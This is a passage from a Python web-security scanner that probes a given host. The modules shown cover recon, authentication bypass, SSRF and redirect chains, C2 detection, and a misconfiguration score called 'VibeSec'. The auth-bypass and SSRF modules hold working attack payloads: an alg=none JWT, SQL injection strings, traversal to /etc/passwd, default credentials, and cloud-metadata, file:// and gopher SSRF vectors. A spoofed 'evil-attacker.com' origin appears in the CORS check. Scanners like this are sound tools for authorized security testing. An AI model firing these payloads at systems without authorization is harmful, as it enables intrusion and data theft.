    categories_run.append("Cookie Security")
    if r["status"]:
        set_cookie = r["headers"].get("set-cookie", "")
        if set_cookie:
            issues = []
            if "secure" not in set_cookie.lower(): issues.append("missing Secure flag")
            if "httponly" not in set_cookie.lower(): issues.append("missing HttpOnly flag")
            if "samesite" not in set_cookie.lower(): issues.append("missing SameSite flag")
            if issues:
                add(f"Cookie security issues: {', '.join(issues)}", "medium", "cookies",
                    f"Cookie: {set_cookie[:80]}", "; ".join(issues))

    # 12. WAF detection
    categories_run.append("WAF Detection")
    if r["status"]:
        server = r["headers"].get("server", "").lower()
        if "cloudflare" in server:
            add("WAF detected: Cloudflare", "info", "waf", "Cloudflare WAF in front of target", "server: cloudflare")
        elif "akamai" in server:
            add("WAF detected: Akamai", "info", "waf", "Akamai WAF", "server: akamai")
        elif "imperva" in server or "incapsula" in server:
            add("WAF detected: Imperva/Incapsula", "info", "waf", "Imperva WAF", "server: imperva")
        else:
            add("No obvious WAF detected", "low", "waf", "Server header doesn't reveal a WAF", server or "(empty)")

    # 13. JavaScript bundles / framework
    categories_run.append("JS Framework Fingerprint")
    if r["status"] and r["body"]:
        body_lower = r["body"].lower()
        for fw in ["react", "vue", "angular", "next.js", "__next", "nuxt", "svelte", "ember", "backbone"]:
            if fw in body_lower:
                add(f"Frontend framework: {fw}", "info", "framework", f"Signal for {fw} detected", fw)

    severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for f in findings:
        severity_counts[f["severity"]] = severity_counts.get(f["severity"], 0) + 1

    return {
        "module": "RECON",
        "categories_run": categories_run,
        "findings": findings,
        "total_findings": len(findings),
        "severity_counts": severity_counts,
    }

# ══════════════════════════════════════════════════════════════════════════════
# MODULE 2: AUTH BYPASS — 15 techniques
# ══════════════════════════════════════════════════════════════════════════════

AUTH_BYPASS_TESTS = [
    {"id": "AB-001", "name": "JWT None Algorithm", "technique": "Send a JWT signed with alg=none to bypass verification",
     "payload": lambda h: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0."},
    {"id": "AB-002", "name": "SQL Auth Bypass — admin'--", "technique": "Classic SQL injection in login form",
     "payload": lambda h: "admin'--"},
    {"id": "AB-003", "name": "SQL Auth Bypass — ' OR 1=1--", "technique": "Universal SQL auth bypass",
     "payload": lambda h: "' OR 1=1--"},
    {"id": "AB-004", "name": "OAuth Redirect URI Bypass", "technique": "Open redirect in OAuth callback",
     "payload": lambda h: f"https://{h}/oauth/callback?redirect_uri=https://evil.example.com"},
    {"id": "AB-005", "name": "Authorization Header Bearer Empty", "technique": "Empty bearer token",
     "payload": lambda h: ""},
    {"id": "AB-006", "name": "Authorization Header Bearer admin", "technique": "Plain text admin token",
     "payload": lambda h: "admin"},
    {"id": "AB-007", "name": "X-Forwarded-For Spoofing", "technique": "Trusted-internal header spoof",
     "payload": lambda h: "127.0.0.1"},
    {"id": "AB-008", "name": "X-Original-URL Override", "technique": "IIS/ASP.NET path override",
     "payload": lambda h: "/admin"},
    {"id": "AB-009", "name": "Path Traversal to Auth File", "technique": "Read auth config via traversal",
     "payload": lambda h: "../../etc/passwd"},
    {"id": "AB-010", "name": "Default Credentials admin/admin", "technique": "Default credential test",
     "payload": lambda h: "admin:admin"},
    {"id": "AB-011", "name": "Default Credentials admin/password", "technique": "Default credential test",
     "payload": lambda h: "admin:password"},
    {"id": "AB-012", "name": "Weak API Key — sk-test", "technique": "Test API key",
     "payload": lambda h: "sk-test"},
    {"id": "AB-013", "name": "Mass Assignment role=admin", "technique": "Mass assignment escalation",
     "payload": lambda h: '{"role":"admin","isAdmin":true}'},
    {"id": "AB-014", "name": "HTTP Method Override — X-HTTP-Method-Override", "technique": "Bypass GET restriction",
     "payload": lambda h: "DELETE"},
    {"id": "AB-015", "name": "Cookie Auth Bypass — admin=true", "technique": "Client-side role cookie",
     "payload": lambda h: "admin=true; role=admin"},
]

def module_auth_bypass(host: str) -> Dict[str, Any]:
    results = []
    for t in AUTH_BYPASS_TESTS:
        payload_val = t["payload"](host)
        # Test against common auth endpoints
        for ep in ["/admin", "/api/user", "/v1/user", "/api/me", "/profile"]:
            url = f"https://{host}{ep}"
            headers = {}
            if "JWT" in t["name"]:
                headers["Authorization"] = f"Bearer {payload_val}"
            elif "X-Forwarded" in t["name"]:
                headers["X-Forwarded-For"] = payload_val
            elif "X-Original-URL" in t["name"]:
                headers["X-Original-URL"] = payload_val
            elif "X-HTTP-Method" in t["name"]:
                headers["X-HTTP-Method-Override"] = payload_val
            elif "Cookie" in t["name"]:
                headers["Cookie"] = payload_val
            elif "Authorization" in t["name"]:
                headers["Authorization"] = f"Bearer {payload_val}"
            else:
                headers["X-Test-Payload"] = payload_val
            r = http_probe(url, method="GET", headers=headers, timeout=4)
            # Detect potential bypass: 200/302 instead of 401/403
            bypass = r["status"] in (200, 301, 302) and r["status"] != 401 and r["status"] != 403
            results.append({
                "id": t["id"], "name": t["name"], "technique": t["technique"],
                "endpoint": ep, "payload": payload_val[:80],
                "status": r["status"], "bypass_success": bypass,
                "bodyPreview": r["body"][:120],
            })
            if r["status"] == 0:
                break  # Endpoint likely doesn't exist
    bypasses = [r for r in results if r["bypass_success"]]
    return {
        "module": "AUTH BYPASS",
        "techniques_tested": len(AUTH_BYPASS_TESTS),
        "endpoints_per_technique": 5,
        "total_attempts": len(results),
        "bypasses_successful": len(bypasses),
        "results": results,
        "bypass_findings": bypasses,
    }

# ══════════════════════════════════════════════════════════════════════════════
# MODULE 3: CHAIN HUNTER — SSRF + redirect chain analysis
# ══════════════════════════════════════════════════════════════════════════════

def module_chain_hunter(host: str) -> Dict[str, Any]:
    """Hunt SSRF and redirect chains."""
    findings = []
    chains_tested = 0

    # SSRF test vectors
    ssrf_vectors = [
        {"id": "CH-001", "name": "Internal IP SSRF", "vector": "http://127.0.0.1", "endpoint": "/api/fetch"},
        {"id": "CH-002", "name": "AWS Metadata SSRF", "vector": "http://169.254.169.254/latest/meta-data/", "endpoint": "/api/fetch"},
        {"id": "CH-003", "name": "GCP Metadata SSRF", "vector": "http://metadata.google.internal/computeMetadata/v1/", "endpoint": "/api/fetch"},
        {"id": "CH-004", "name": "Cloudflare Metadata SSRF", "vector": "http://169.254.169.254/cdn-cgi/trace", "endpoint": "/api/fetch"},
        {"id": "CH-005", "name": "File Protocol SSRF", "vector": "file:///etc/passwd", "endpoint": "/api/fetch"},
        {"id": "CH-006", "name": "Gopher Protocol SSRF", "vector": "gopher://127.0.0.1:25/_HELO%20test", "endpoint": "/api/fetch"},
        {"id": "CH-007", "name": "DNS Rebinding SSRF", "vector": "http://rebind.example.com", "endpoint": "/api/fetch"},
        {"id": "CH-008", "name": "Internal Service SSRF", "vector": "http://localhost:6379/", "endpoint": "/api/fetch"},
        {"id": "CH-009", "name": "Redirect to Internal", "vector": f"https://{host}/redirect?url=http://127.0.0.1", "endpoint": "/redirect"},
        {"id": "CH-010", "name": "URL Parameter SSRF", "vector": "http://127.0.0.1", "endpoint": "/api/proxy"},
    ]

    # Common SSRF parameters
    ssrf_params = ["url", "target", "uri", "fetch", "next", "redirect", "redirectUrl", "redirect_uri",
                   "callback", "proxy", "src", "source", "image", "img", "file", "load"]

    # Probe SSRF endpoints
    for sv in ssrf_vectors:
        chains_tested += 1
        for param in ssrf_params[:3]:  # test 3 params per vector
            url = f"https://{host}{sv['endpoint']}?{param}={urllib.parse.quote(sv['vector'], safe='')}"
            r = http_probe(url, timeout=5)
            # Detect SSRF: response contains internal content
            internal_signals = ["root:x:" in r["body"], "instance-id" in r["body"],
                                "ami-id" in r["body"], "computeMetadata" in r["body"],
                                "cdn-cgi" in r["body"], "redis" in r["body"].lower()]
            ssrf_hit = any(internal_signals) or (r["status"] == 200 and len(r["body"]) > 100 and
                                                  any(s in r["body"][:200] for s in ["root", "instance", "metadata"]))
            findings.append({
                "id": sv["id"], "name": sv["name"], "vector": sv["vector"],
                "endpoint": sv["endpoint"], "param": param,
                "status": r["status"], "ssrf_detected": ssrf_hit,
                "bodyPreview": r["body"][:120],
            })
            if r["status"] == 0:
                break

    # Redirect chain analysis
    chains_tested += 1
    redirect_chains = []
    for path in ["/", "/login", "/admin", "/api", "/redirect"]:
        url = f"https://{host}{path}"
        r = http_probe(url, timeout=4)
        if r["status"] in (301, 302, 303, 307, 308):
            location = r["headers"].get("location", "")
            redirect_chains.append({
                "start": path, "status": r["status"], "redirects_to": location,
                "open_redirect": "evil" in location.lower() or "//" in location[:8],
            })

    return {
        "module": "CHAIN HUNTER",
        "chains_tested": chains_tested,
        "ssrf_vectors": len(ssrf_vectors),
        "findings": findings,
        "ssrf_detected": len([f for f in findings if f["ssrf_detected"]]),
        "redirect_chains": redirect_chains,
        "open_redirects": len([c for c in redirect_chains if c["open_redirect"]]),
    }

# ══════════════════════════════════════════════════════════════════════════════
# MODULE 4: BOT HUNTER — C2 / bot infrastructure detection
# ══════════════════════════════════════════════════════════════════════════════

BOT_SIGNATURES = [
    {"name": "Mirai C2", "ports": [23, 2323, 7547], "banner": ["mirai", "bot"]},
    {"name": "Cobalt Strike", "ports": [443, 80, 8080], "banner": ["cobalt", "beacon", "strike"]},
    {"name": "Metasploit", "ports": [4444, 8443], "banner": ["meterpreter", "msfconsole"]},
    {"name": "Emotet", "ports": [8080, 443], "banner": ["emotet"]},
    {"name": "TrickBot", "ports": [447, 808], "banner": ["trickbot"]},
    {"name": "QakBot", "ports": [8080, 443], "banner": ["qakbot", "qbot"]},
    {"name": "SolarWinds SUNBURST", "ports": [443], "banner": ["sunburst", "solarwinds"]},
    {"name": "Log4Shell", "ports": [443, 80, 389], "banner": ["jndi:ldap", "jndi:rmi"]},
    {"name": "AsyncRAT", "ports": [6666, 7777], "banner": ["asyncrat"]},
    {"name": "njRAT", "ports": [1177, 5552], "banner": ["njrat"]},
]

def module_bot_hunter(host: str) -> Dict[str, Any]:
    """Hunt for C2 / bot infrastructure on the target."""
    detections = []
    # Resolve host
    try:
        ip = socket.gethostbyname(host)
    except Exception as e:
        audit_log("bot.resolve.error", status=type(e).__name__, detail=str(e)[:120])
        ip = host

    # Probe each signature
    for sig in BOT_SIGNATURES:
        for port in sig["ports"]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                if s.connect_ex((ip, port)) == 0:
                    # Try to grab banner
                    try:
                        s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner = s.recv(512).decode("utf-8", errors="replace").lower()
                    except Exception:
                        banner = ""
                    detected = any(b in banner for b in sig["banner"])
                    detections.append({
                        "signature": sig["name"], "port": port, "open": True,
                        "banner_snippet": banner[:80],
                        "bot_detected": detected,
                    })
                s.close()
            except Exception as e:
                audit_log("bot.probe.error", status=type(e).__name__, detail=f"{sig['name']}:{port} {str(e)[:80]}")

    # Check for known C2 paths
    c2_paths = ["/beacon", "/c2", "/panel", "/gate.php", "/cmd.php", "/mad Devil", "/login.php",
                "/bot/checkin", "/api/bot", "/control"]
    for path in c2_paths:
        url = f"https://{host}{path}"
        r = http_probe(url, timeout=4)
        if r["status"] not in (0, 404) and r["status"] < 500:
            detections.append({
                "signature": "C2 Path Probe", "path": path, "status": r["status"],
                "body_snippet": r["body"][:80],
                "bot_detected": r["status"] == 200,
            })

    bot_hits = [d for d in detections if d.get("bot_detected")]
    return {
        "module": "BOT HUNTER",
        "signatures_tested": len(BOT_SIGNATURES),
        "paths_probed": len(c2_paths),
        "detections": detections,
        "total_detections": len(detections),
        "bot_hits": len(bot_hits),
        "bot_findings": bot_hits,
    }

# ══════════════════════════════════════════════════════════════════════════════
# MODULE 5 + 6: GORGON + OBLIVION (import from sibling modules)
# ══════════════════════════════════════════════════════════════════════════════

CACHE_DIR = "/home/z/my-project/download"

# ── Filename safety (m4) ────────────────────────────────────────────────────
_FILENAME_UNSAFE_RE = re.compile(r'[\x00-\x1f\x7f\x80-\x9f/\\:\n\r\t]')
_FILENAME_MAX_LEN = 120

def _safe_filename(raw: str) -> str:
    """Sanitize a user-supplied string for use as a filename component.

    Strips: null bytes, control chars, path separators, backslashes.
    Truncates to _FILENAME_MAX_LEN. Rejects empty results (returns 'unnamed').
    """
    cleaned = _FILENAME_UNSAFE_RE.sub('_', raw)
    # Collapse consecutive underscores
    cleaned = re.sub(r'_{2,}', '_', cleaned)
    cleaned = cleaned.strip('._-')
    cleaned = cleaned[:_FILENAME_MAX_LEN]
    if not cleaned or cleaned in ('.', '..'):
        return 'unnamed'
    return cleaned

def _find_cache(prefix: str, host: str) -> Optional[str]:
    """Find a cached JSON for this host with the given prefix."""
    if not os.path.isdir(CACHE_DIR):
        return None
    safe = _safe_filename(host)
    candidates = [
        f"{CACHE_DIR}/{prefix}_{safe}.json",
        f"{CACHE_DIR}/{prefix}_{safe}_v2.json",
    ]
    # also any *{host}*.json
    for f in sorted(os.listdir(CACHE_DIR), reverse=True):
        if f.startswith(prefix) and safe in f and f.endswith(".json"):
            candidates.append(f"{CACHE_DIR}/{f}")
    for c in candidates:
        if os.path.exists(c) and os.path.getsize(c) > 100:
            return c
    return None

def module_gorgon(host: str) -> Dict[str, Any]:
    """Run GORGON ULTRA — uses cache if available, otherwise in-process call."""
    # 1. Try cache
    cached = _find_cache("gorgon", host) or _find_cache("model_breaker", host)
    if cached:
        try:
            with open(cached) as f:
                data = json.load(f)
            data["_cached_from"] = cached
            return data
        except Exception as e:
            audit_log("gorgon.cache_read.error", status=type(e).__name__, detail=str(e)[:120])
    # 2. In-process import
    sys.path.insert(0, "/home/z/my-project/scripts")
    try:
        import model_breaker
        if hasattr(model_breaker, "run_gorgon_scan"):
            return model_breaker.run_gorgon_scan(host)
    except Exception as e:
        audit_log("gorgon.import.error", status=type(e).__name__, detail=str(e)[:120])
    # 3. Subprocess fallback
    import subprocess as sp
    try:
        out_file = f"/tmp/gorgon_{_safe_filename(host)}.json"
        r = sp.run(["python3", "/home/z/my-project/scripts/model_breaker.py", host, "-o", out_file],
                   capture_output=True, text=True, timeout=180)
        if os.path.exists(out_file):
            with open(out_file) as f:
                return json.load(f)
    except Exception as e:
        return {"module": "GORGON ULTRA", "error": str(e)}
    return {"module": "GORGON ULTRA", "error": "no output"}

def module_oblivion(host: str) -> Dict[str, Any]:
    """Run OBLIVION — uses cache if available, otherwise in-process call."""
    # 1. Try cache
    cached = _find_cache("oblivion", host)
    if cached:
        try:
            with open(cached) as f:
                data = json.load(f)
            data["_cached_from"] = cached
            return data
        except Exception as e:
            audit_log("oblivion.cache_read.error", status=type(e).__name__, detail=str(e)[:120])
    # 2. In-process import
    sys.path.insert(0, "/home/z/my-project/scripts")
    try:
        import oblivion
        if hasattr(oblivion, "run_oblivion"):
            return oblivion.run_oblivion(host)
    except Exception as e:
        audit_log("oblivion.import.error", status=type(e).__name__, detail=str(e)[:120])
    # 3. Subprocess fallback
    import subprocess as sp
    try:
        out_file = f"/tmp/oblivion_{_safe_filename(host)}.json"
        r = sp.run(["python3", "/home/z/my-project/scripts/oblivion.py", host, "-o", out_file],
                   capture_output=True, text=True, timeout=240)
        if os.path.exists(out_file):
            with open(out_file) as f:
                return json.load(f)
    except Exception as e:
        return {"module": "OBLIVION", "error": str(e)}
    return {"module": "OBLIVION", "error": "no output"}

# ══════════════════════════════════════════════════════════════════════════════
# MODULE 7: VIBESEC — AI/Vibe-Coding Vulnerability Benchmark
# ══════════════════════════════════════════════════════════════════════════════

def _vibesec_compute_grade(score: int) -> Tuple[str, str]:
    """Map a 0-100 score to a letter grade and rich color."""
    for threshold, grade, color in VIBESEC_GRADE_MAP:
        if score >= threshold:
            return grade, color
    return "F", "bold bright_red"


def _vibesec_render_badge(target: str, grade: str, score: int) -> str:
    """Generate a Markdown badge snippet for GitHub READMEs."""
    color_map = {"A+": "brightgreen", "A": "green", "B": "yellow", "C": "red", "D": "orange", "F": "red"}
    badge_color = color_map.get(grade, "lightgrey")
    return f'![VibeSec Grade {grade}](https://img.shields.io/badge/VibeSec-{grade}-{badge_color}?style=for-the-badge&labelColor=0B1C2C)'


def module_vibesec(host: str) -> Dict[str, Any]:
    """Rapid AI/vibe-coding vulnerability benchmark.

    Checks four categories:
      1. Exposed env/config endpoints
      2. Unauthenticated API/webhook routes
      3. Permissive CORS policies
      4. Exposed anon/public backend keys (Supabase, Firebase, S3, R2)

    Returns a 100-point VibeSec score with A+ to F grade mapping.
    Every finding is verified via native HTTP response validation (zero fabrication).
    """
    findings: List[Dict[str, Any]] = []
    deductions = 0  # each vulnerability deducts from 100

    base_url = host if host.startswith("http") else f"https://{host}"

    def add(title, severity, category, description, evidence, points_deducted):
        nonlocal deductions
        deductions += points_deducted
        findings.append({
            "title": title, "severity": severity, "category": category,
            "description": description, "evidence": evidence, "asset": host,
            "points_deducted": points_deducted,
        })

    # ── Category 1: Exposed Environment/Config Files ──────────────────────
    audit_log("vibesec.config.start", detail=host)
    for path in VIBESEC_SENSITIVE_PATHS:
        url = base_url.rstrip("/") + path
        resp = http_probe(url, timeout=5)
        status = resp.get("status", 0)
        body = resp.get("body", "")[:2048]
        if status == 200 and len(body) > 10:
            # Verify: real content, not just a redirect page
            has_secrets = any(kw in body.lower() for kw in [
                "api_key", "secret", "password", "token", "database_url",
                "private_key", "supabase", "firebase", "aws_access",
            ])
            if has_secrets:
                add(f"Exposed config — {path}", "critical", "exposed_config",
                    f"Sensitive configuration endpoint accessible: {path} (200 OK, {len(body)} bytes, contains secrets)",
                    f"GET {path} → {status} ({len(body)}B, secrets detected)", 15)
            else:
                add(f"Exposed config — {path}", "high", "exposed_config",
                    f"Configuration endpoint accessible: {path} (200 OK, {len(body)} bytes)",
                    f"GET {path} → {status} ({len(body)}B)", 10)
        elif status in (200, 201, 301, 302, 307, 308) and status != 404:
            add(f"Config path accessible — {path}", "medium", "exposed_config",
                f"Endpoint returned {status} (may redirect or serve partial content)",
                f"GET {path} → {status}", 5)
    audit_log("vibesec.config.done", detail=f"{len([f for f in findings if f['category'] == 'exposed_config'])} findings")

    # ── Category 2: Unauthenticated API/Webhook Routes ────────────────────
    audit_log("vibesec.api.start", detail=host)
    for path in VIBESEC_API_PATHS:
        url = base_url.rstrip("/") + path
        resp = http_probe(url, timeout=5)
        status = resp.get("status", 0)
        body = resp.get("body", "")[:2048]
        if status == 200:
            # Check for auth-required indicators
            body_lower = body.lower()
            is_protected = any(kw in body_lower for kw in [
                "unauthorized", "401", "forbidden", "authentication required",
                "\"error\"", "login required",
            ])
            if not is_protected and len(body) > 20:
                add(f"Unauthenticated API — {path}", "high", "unauth_api",
                    f"API route accessible without authentication: {path} (200 OK, {len(body)} bytes)",
                    f"GET {path} → {status} (no auth required)", 10)
            elif status == 200:
                add(f"API route reachable — {path}", "medium", "unauth_api",
                    f"API route returned 200 but may have auth checks in POST/DELETE",
                    f"GET {path} → {status}", 5)
        elif status in (403, 401):
            pass  # properly protected — no finding
        elif status == 404:
            pass  # not found — no finding
        elif status == 405:
            add(f"API route exists — {path}", "low", "unauth_api",
                f"API route exists (405 Method Not Allowed) — may be exploitable with correct method",
                f"GET {path} → 405", 3)
    audit_log("vibesec.api.done", detail=f"{len([f for f in findings if f['category'] == 'unauth_api'])} findings")

    # ── Category 3: CORS Policy Analysis ────────────────────────────────────
    audit_log("vibesec.cors.start", detail=host)
    # Test with an origin probe
    cors_resp = http_probe(base_url, timeout=5)
    cors_headers = cors_resp.get("headers", {})
    acao = cors_headers.get("Access-Control-Allow-Origin", "")
    if acao == "*":
        add("Permissive CORS — wildcard origin", "high", "cors",
            "Access-Control-Allow-Origin: * — any domain can make cross-origin requests",
            f"CORS header: {acao}", 12)
    elif acao and acao != "null":
        # Specific origin — check if it reflects the Origin header
        reflect_resp = http_probe(base_url, headers={"Origin": "https://evil-attacker.com"}, timeout=5)
        reflected = reflect_resp.get("headers", {}).get("Access-Control-Allow-Origin", "")
        if "evil-attacker" in reflected:
            add("CORS origin reflection vulnerability", "critical", "cors",
                "Server reflects any Origin header back — allows cross-origin attacks from any domain",
                f"Sent Origin: https://evil-attacker.com, got back: {reflected}", 15)
    allow_cred = cors_headers.get("Access-Control-Allow-Credentials", "")
    if acao != "" and allow_cred.lower() == "true":
        add("CORS credentials exposed", "high", "cors",
            "Access-Control-Allow-Credentials: true with non-empty Allow-Origin",
            f"Allow-Credentials: true, Allow-Origin: {acao or '(reflected)'}", 10)
    if not acao:
        # No CORS header at all — check if it's a JSON API that should have CORS
        ct = cors_headers.get("content-type", "")
        if "json" in ct.lower():
            add("JSON API without CORS headers", "low", "cors",
                "API returns JSON but sets no CORS headers — may be intentional or oversight",
            f"Content-Type: {ct}, no CORS headers", 3)
    audit_log("vibesec.cors.done", detail=f"{len([f for f in findings if f['category'] == 'cors'])} findings")

    # ── Category 4: Exposed Anon/Public Backend Keys ────────────────────────
    audit_log("vibesec.anon_keys.start", detail=host)
    # Check the main page body for exposed service URLs
    main_body = http_probe(base_url, timeout=5).get("body", "")[:16384]
    for name, pattern in VIBESEC_ANON_KEY_PATTERNS:
        matches = pattern.findall(main_body)
        if matches:
            unique = list(set(matches))[:5]
            # Verify each match resolves (zero fabrication)
            verified = []
            for m in unique:
                test_url = f"https://{m}" if not m.startswith("http") else m
                probe = http_probe(test_url, timeout=3)
                if probe.get("status", 0) > 0:
                    verified.append(m)
            if verified:
                add(f"Exposed {name} backend — {len(verified)} instance(s)", "critical", "anon_keys",
                    f"Public {name} URLs found in page source and confirmed reachable",
                    f"{name}: {', '.join(verified[:3])}", 15)
            else:
                add(f"Detected {name} references — not verified", "medium", "anon_keys",
                    f"{name} URLs found in page source but could not confirm reachability",
                    f"{name}: {', '.join(unique[:3])}", 5)

    # Also check robots.txt and sitemap for exposed service URLs
    for check_path in ["/robots.txt", "/sitemap.xml"]:
        check_resp = http_probe(base_url.rstrip("/") + check_path, timeout=5)
        if check_resp.get("status") == 200:
            check_body = check_resp.get("body", "")[:8192]
            for name, pattern in VIBESEC_ANON_KEY_PATTERNS:
                matches = pattern.findall(check_body)
                if matches and not any(f["title"].startswith(f"Exposed {name}") for f in findings):
                    unique = list(set(matches))[:3]
                    add(f"{name} URLs in {check_path}", "medium", "anon_keys",
                        f"Public {name} URLs exposed in {check_path}",
                        f"{check_path}: {', '.join(unique)}", 5)
    audit_log("vibesec.anon_keys.done", detail=f"{len([f for f in findings if f['category'] == 'anon_keys'])} findings")

    # ── Category 5: Missing Security Headers (HSTS/CSP/etc.) ─────────────
    audit_log("vibesec.security_headers.start", detail=host)
    root_resp = http_probe(base_url, timeout=5)
    root_headers = root_resp.get("headers", {})
    for header_name, display_name, severity, pts in VIBESEC_SECURITY_HEADERS:
        if header_name.lower() not in {k.lower() for k in root_headers}:
            add(f"Missing {display_name} header", severity, "security_headers",
                f"{display_name} ({header_name}) is not set — leaves users vulnerable to specific attacks",
                f"Header {header_name} absent from root response", pts)
    audit_log("vibesec.security_headers.done", detail=f"{len([f for f in findings if f['category'] == 'security_headers'])} findings")

    # ── Category 6: Exposed Database Admin Interfaces ─────────────────────
    audit_log("vibesec.db_admin.start", detail=host)
    for path in VIBESEC_DB_ADMIN_PATHS:
        url = base_url.rstrip("/") + path
        resp = http_probe(url, timeout=5)
        status = resp.get("status", 0)
        body = resp.get("body", "")[:2048]
        if status == 200 and len(body) > 20:
            # Verify it's actually a DB admin page, not a generic 200
            db_signals = ["phpmyadmin", "adminer", "mongo", "redis", "pgadmin",
                          "prisma", "graphql", "apollo", "database", "mysql", "postgres"]
            body_lower = body.lower()
            is_db = any(sig in body_lower for sig in db_signals)
            is_protected = bool(VIBESEC_AUTH_PATTERN.search(body))
            if is_db and not is_protected:
                add(f"Exposed DB admin — {path}", "critical", "exposed_db",
                    f"Database management interface accessible without auth: {path} (200 OK)",
                    f"GET {path} -> 200 (DB admin panel, no auth)", 15)
            elif is_db:
                add(f"DB admin reachable — {path}", "high", "exposed_db",
                    f"Database management interface exists at {path} (may require POST auth)",
                    f"GET {path} -> 200 (DB signals detected)", 8)
        elif status == 401 or status == 403:
            pass  # properly protected
    audit_log("vibesec.db_admin.done", detail=f"{len([f for f in findings if f['category'] == 'exposed_db'])} findings")

    # ── Category 7: S3/R2/Cloud Storage Directory Listings ────────────────
    audit_log("vibesec.storage_exposure.start", detail=host)
    for path in VIBESEC_STORAGE_EXPOSURE_PATHS:
        url = base_url.rstrip("/") + path
        resp = http_probe(url, timeout=5)
        status = resp.get("status", 0)
        body = resp.get("body", "")[:4096]
        if status == 200 and len(body) > 50:
            # Check for S3 XML listing or Apache/nginx directory listing
            is_listing = any(indicator in body for indicator in VIBESEC_S3_LISTING_INDICATORS)
            is_html_listing = "Index of" in body or "<title>Index of" in body or "Directory listing" in body
            if is_listing or is_html_listing:
                add(f"Storage directory listing — {path}", "critical", "storage_exposure",
                    f"Cloud storage/static directory listing enabled: {path} (200 OK, listing exposed)",
                    f"GET {path} -> 200 (directory listing)", 15)
            else:
                add(f"Storage path accessible — {path}", "medium", "storage_exposure",
                    f"Storage path returns 200 but no listing detected: {path}",
                    f"GET {path} -> 200 ({len(body)}B)", 3)
    # Also check S3/R2 URLs from anon key patterns for listing behavior
    for name, pattern in VIBESEC_ANON_KEY_PATTERNS:
        if name in ("aws-s3", "cloudflare-r2", "gcp-storage", "azure-blob"):
            matches = pattern.findall(main_body)
            for m in list(set(matches))[:3]:
                test_url = f"https://{m}" if not m.startswith("http") else m
                probe = http_probe(test_url, timeout=4)
                pbody = probe.get("body", "")[:4096]
                if probe.get("status") == 200 and any(ind in pbody for ind in VIBESEC_S3_LISTING_INDICATORS):
                    add(f"{name} bucket listing — {m}", "critical", "storage_exposure",
                        f"{name} bucket exposes directory listing: {m}",
                        f"{m} -> 200 (bucket listing)", 15)
    audit_log("vibesec.storage_exposure.done", detail=f"{len([f for f in findings if f['category'] == 'storage_exposure'])} findings")

    # ── Score Calculation ──────────────────────────────────────────────────
    raw_score = max(0, 100 - deductions)
    # Normalize: if no findings at all, perfect score
    if not findings:
        raw_score = 100
    # Clamp
    raw_score = min(100, max(0, raw_score))
    grade, grade_color = _vibesec_compute_grade(raw_score)
    badge_md = _vibesec_render_badge(host, grade, raw_score)

    severity_counts: Dict[str, int] = {}
    for f in findings:
        sev = f["severity"]
        severity_counts[sev] = severity_counts.get(sev, 0) + 1

    result = {
        "module": "VIBESEC",
        "vibesec_score": raw_score,
        "grade": grade,
        "grade_color": grade_color,
        "badge_markdown": badge_md,
        "total_findings": len(findings),
        "severity_counts": severity_counts,
        "findings": findings,
        "categories_checked": ["exposed_config", "unauth_api", "cors", "anon_keys",
                                 "security_headers", "exposed_db", "storage_exposure"],
        "max_possible_score": 100,
    }
    audit_log("vibesec.complete", detail=f"score={raw_score} grade={grade} findings={len(findings)}")
    return result


def render_vibesec_panel(vibesec: Dict[str, Any]) -> None:
    """Render VibeSec results as a Rich panel with grade, table, and badge."""
    score = vibesec.get("vibesec_score", 0)
    grade = vibesec.get("grade", "F")
    grade_color = vibesec.get("grade_color", "bold bright_red")
    total = vibesec.get("total_findings", 0)
    sc = vibesec.get("severity_counts", {})

    # Score bar
    bar_width = 40
    filled = int(score / 100 * bar_width)
    bar = "█" * filled + "░" * (bar_width - filled)

    console.print(Panel(
        Group(
            Text("\n  VIBESEC BENCHMARK — AI/Vibe-Coding Vulnerability Audit", style="bold bright_green"),
            Text(f""),
            Text(f"  Score: {bar} [bold {grade_color}]{score}/100 ({grade})[/{grade_color}]", style="white"),
            Text(f""),
            Text(f"  Findings: [bold]{total}[/]  "
                 f"[bright_red]{sc.get('critical',0)} critical[/], "
                 f"[red]{sc.get('high',0)} high[/], "
                 f"[yellow]{sc.get('medium',0)} medium[/], "
                 f"[green]{sc.get('low',0)} low[/], "
                 f"[dim]{sc.get('info',0)} info[/]"),
        ),
        border_style="bright_green",
        title="[bold]VIBESEC[/bold]",
        title_align="left",
        padding=(1, 2),
    ))

    # Findings table
    findings = vibesec.get("findings", [])
    if findings:
        table = Table(title=f"Vibe Coding Vulnerabilities — {len(findings)} detected",
                      border_style="bright_green", header_style="bold bright_green", show_lines=False)
        table.add_column("Severity", style="bold", width=10)
        table.add_column("Category", style="cyan", width=16)
        table.add_column("Finding", style="white")
        table.add_column("Pts", style="yellow", width=5)
        sev_colors = {"critical": "bright_red", "high": "red", "medium": "yellow", "low": "green", "info": "dim"}
        for f in findings[:20]:
            sev = f["severity"]
            table.add_row(
                f"[{sev_colors.get(sev, 'white')}]{sev.upper()}[/{sev_colors.get(sev, 'white')}]",
                f["category"], f["title"][:60], str(f.get("points_deducted", 0))
            )
        console.print(table)

    # Badge snippet
    badge = vibesec.get("badge_markdown", "")
    if badge:
        console.print()
        console.print(Panel(
            Group(
                Text("  GitHub README Badge (copy-paste):", style="bold dim"),
                Text(f"  {badge}", style="cyan"),
            ),
            border_style="dim",
            title="[dim]Badge[/dim]",
            title_align="left",
            padding=(0, 2),
        ))


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 8: NHI GRAPH — Non-Human Identity & Blast-Radius Mapping
# ══════════════════════════════════════════════════════════════════════════════

def _nhi_verify_match(value: str, body: str) -> bool:
    """Verify an identity match is real, not documentation/placeholder."""
    if not value:
        return False
    placeholders = {"example", "your-", "xxx", "placeholder", "replace", "changeme", "todo", "insert"}
    val_lower = value.lower()
    for ph in placeholders:
        if ph in val_lower:
            return False
    # Reject if surrounded by documentation markers
    try:
        if re.search(r'<!--.*?-->.*' + re.escape(value), body[:2000]):
            return False
        if re.search(r'["\'][\s]*' + re.escape(value) + r'[\s]*["\'].*#.*example', body[:2000], re.I):
            return False
    except Exception:
        pass
    # Reject if too short
    if len(value) < 8:
        return False
    # Require at least 2 different character classes
    classes = 0
